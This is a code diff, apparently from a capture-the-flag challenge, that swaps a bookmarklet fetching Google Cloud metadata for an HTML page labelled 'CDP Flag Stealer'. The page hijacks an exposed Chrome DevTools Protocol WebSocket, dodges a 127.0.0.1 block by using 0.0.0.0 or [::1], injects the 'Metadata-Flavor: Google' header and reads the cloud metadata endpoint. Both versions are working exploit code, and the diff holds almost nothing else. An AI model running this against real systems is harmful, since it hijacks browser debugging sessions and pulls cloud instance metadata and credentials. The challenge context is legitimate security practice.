@@ -1,11 +1,83 @@
-<a href="javascript:(function(){
-  var s=document.createElement('script');
-  s.src='data:text/javascript,'+encodeURIComponent(
-    'fetch(\"http://metadata.google.internal/computeMetadata/v1beta1/\",'+
-    '{headers:{\"Metadata-Flavor\":\"Google\"}})'+
-    '.then(r=>r.text())'+
-    '.then(d=>alert(d.slice(0,2000)))'+
-    '.catch(e=>alert(\"Error:\"+e))'
-  );
-  document.body.appendChild(s);
-})()">Get Metadata</a>
+<body>
+<h2>CDP Flag Stealer</h2>
+<p>
+  1. Port (e.g. 9222): <br><input id="port" value="9222"><br><br>
+  2. Token Path (e.g. /devtools/browser/abc...): <br><input id="path" value="/devtools/browser/"><br><br>
+  3. Host: <br><input id="host" value="0.0.0.0"><br><br>
+  <button onclick="run()">PWN IT</button>
+</p>
+<div id="console"></div>
+<script>
+function log(m) { document.getElementById("console").innerHTML += "<div class=log>"+m+"</div>"; }
+
+function run() {
+    var port = document.getElementById("port").value;
+    var path = document.getElementById("path").value;
+    var host = document.getElementById("host").value;
+    
+    // THE BYPASS: Use 0.0.0.0 to satisfy "IP" check but bypass "127.0.0.1" block
+
+    // If 0.0.0.0 fails, un-comment the next line to try IPv6:
+    // host = "[::1]";
+    
+    var url = "ws://" + host + ":" + port + path;
+    
+    log("Connecting to: " + url);
+    
+    try {
+        var ws = new WebSocket(url);
+        
+        ws.onopen = function() {
+            log("<b>[+] Connected! Hijacking...</b>");
+            // 1. Create Target
+            ws.send(JSON.stringify({id: 1, method: "Target.createTarget", params: {url: "about:blank"}}));
+        };
+
+        ws.onmessage = function(e) {
+            var msg = JSON.parse(e.data);
+            
+            // 2. Attach
+            if(msg.id === 1) {
+                var targetId = msg.result.targetId;
+                log("[+] Target Created. Attaching...");
+                ws.send(JSON.stringify({id: 2, method: "Target.attachToTarget", params: {targetId: targetId, flatten: true}}));
+            }
+            
+            // 3. Inject
+            if(msg.id === 2) {
+                var sid = msg.result.sessionId;
+                log("[+] Session Acquired ("+sid+"). Injecting header...");
+                
+                ws.send(JSON.stringify({id: 3, sessionId: sid, method: "Network.enable"}));
+                
+                ws.send(JSON.stringify({
+                    id: 4, sessionId: sid, method: "Network.setExtraHTTPHeaders", 
+                    params: { headers: { "Metadata-Flavor": "Google" } }
+                }));
+                
+                log("[*] Navigating...");
+                ws.send(JSON.stringify({
+                    id: 5, sessionId: sid, method: "Page.navigate", 
+                    params: { url: "http://metadata/" }
+                }));
+                
+                setTimeout(function(){
+                     ws.send(JSON.stringify({
+                        id: 6, sessionId: sid, method: "Runtime.evaluate",
+                        params: { expression: "document.body.innerText", returnByValue: true }
+                    }));
+                }, 1500);
+            }
+            
+            // 4. Flag
+            if(msg.id === 6) {
+                log("<h1 style=color:red;font-size:30px;border:2px solid red>FLAG: " + msg.result.result.value + "</h1>");
+            }
+        };
+        
+        ws.onerror = function(e) {
+            log("<b style=color:red>[-] Connection Failed.</b><br>Try changing 0.0.0.0 to [::1] in the code?");
+        };
+    } catch(e) { log("Error: " + e); }
+}
+</script>
